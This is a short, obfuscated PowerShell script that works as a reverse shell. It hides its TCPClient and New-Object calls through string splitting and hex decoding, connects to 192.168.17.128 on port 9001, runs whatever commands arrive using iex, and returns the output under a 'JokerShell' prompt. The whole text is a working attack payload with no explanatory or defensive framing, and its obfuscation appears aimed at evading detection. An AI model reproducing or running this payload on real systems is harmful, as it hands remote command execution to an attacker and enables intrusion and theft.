$str = "TcP"+"C"+"li"+"e"+"nt";$reversed = -join ($str[-1..-($str.Length)]);
$PJ = @("54", "43", "50", "43", "6C", "69", "65", "6E", "74");
$TChar = $PJ | ForEach-Object { [char][convert]::ToInt32($_, 16) };
$PJChar = -join $TChar;
;$GDBhMnZsDci = &('New'+'-'+'Ob'+'je'+'c'+'t') ('S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'ockets.TCPClient')('192.168.17.128',9001);
$OGdTNZQbcS = $GDBhMnZsDci.('Get'+'St'+'r'+'eam')();[byte[]]$PJChar = 0..65535|%{0};
while(($i = $OGdTNZQbcS.ReAd($PJChar, 0, $PJChar.LeNgTh)) -ne 0){;
$1fc3f098 = (&('New'+'-'+'Ob'+'je'+'c'+'t') -TypENAme Sy''Ste''M.tExT.A''SCi''iEN''coding).('Ge'+'tStRinG')($PJChar,0, $i);
$fb3c97733989bd69eede22507aab10df = (iex ". {  $1fc3f098  } 2>&1" | Ou''t-Str''ing );
$J=$O=$K=$E=$R=$P=$W=$R = ${fb3c97733989bd69eede22507aab10df} + '[94mJokerShell[39m ' + (pwd).Path + '> ';
$s = ("{0}{1}{3}{2}"-f "se''nd","by","e","t"); $s = ([text.encoding]::ASCii).GetBYTeS($R);
$OGdTNZQbcS.Write($s,0,$s.Length);$OGdTNZQbcS.Flush()};$GDBhMnZsDci.Close()
